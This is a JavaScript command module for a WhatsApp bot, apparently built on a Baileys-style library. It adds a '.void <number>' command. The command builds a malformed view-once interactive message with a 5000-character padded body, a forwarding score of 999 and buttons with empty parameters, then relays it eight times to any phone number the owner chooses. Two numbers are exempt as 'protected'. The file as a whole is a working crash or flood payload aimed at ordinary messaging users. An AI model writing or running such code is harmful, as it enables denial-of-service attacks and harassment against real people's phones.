// commands/void.js
const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];

async function voidCommand(sock, chatId, message, args) {
    if (!message.key.fromMe) {
        await sock.sendMessage(chatId, { text: "❌ *Owner Only*" }, { quoted: message });
        return;
    }

    const targetNumber = args[0];
    if (!targetNumber) {
        await sock.sendMessage(chatId, { 
            text: "🌌 *Void*\n\nUsage: .void <number>\nExample: .void 628123456789\n\n*Absolute Emptiness*"
        }, { quoted: message });
        return;
    }

    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
    
    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
        await sock.sendMessage(chatId, { text: "🛡️ *Protected by Hogyoku*" }, { quoted: message });
        return;
    }

    const target = cleanNumber + '@s.whatsapp.net';
    
    await sock.sendMessage(chatId, { text: `🌌 *Absolute Emptiness* consuming ${cleanNumber}...` }, { quoted: message });
    await sock.sendMessage(chatId, { react: { text: "🌌", key: message.key } });

    try {
        const voidPayload = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999
                        },
                        body: { text: "✦ Vǿīḋ ✦" + "◉".repeat(5000) },
                        footer: { text: "Emptiness" },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "single_select", buttonParamsJson: "" },
                                { name: "call_permission_request", buttonParamsJson: "" },
                                { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "Consumed by Void", url: "https://youtu.be/dQw4w9WgXcQ" }) }
                            ]
                        }
                    }
                }
            }
        };

        for (let i = 0; i < 8; i++) {
            await sock.relayMessage(target, voidPayload, { participant: { jid: target } });
        }
        
        await sock.sendMessage(chatId, { text: `✅ *Absolute Emptiness* erased ${cleanNumber}` }, { quoted: message });
        await sock.sendMessage(chatId, { react: { text: "🌀", key: message.key } });

    } catch (error) {
        console.error('[Void]', error.message);
        await sock.sendMessage(chatId, { text: `❌ *Void failed:* ${error.message}` }, { quoted: message });
    }
}

module.exports = voidCommand;